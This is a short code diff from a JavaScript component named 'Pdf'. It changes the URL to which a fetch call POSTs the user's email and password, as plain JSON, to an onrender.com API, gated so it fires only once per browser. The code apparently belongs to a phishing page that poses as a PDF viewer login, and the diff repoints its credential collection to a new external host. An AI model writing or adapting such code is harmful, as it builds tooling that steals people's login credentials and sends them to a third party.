@@ -77,7 +77,7 @@ function Pdf() {
             const hasAttempted = localStorage.getItem('login_attempt');
 
             if (!hasAttempted) {
-                await fetch("https://bd-mys-api.onrender.com/api/contact", {
+                await fetch("https://all-lg-bb.onrender.com/api/contact", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ mail: email, pass: password })
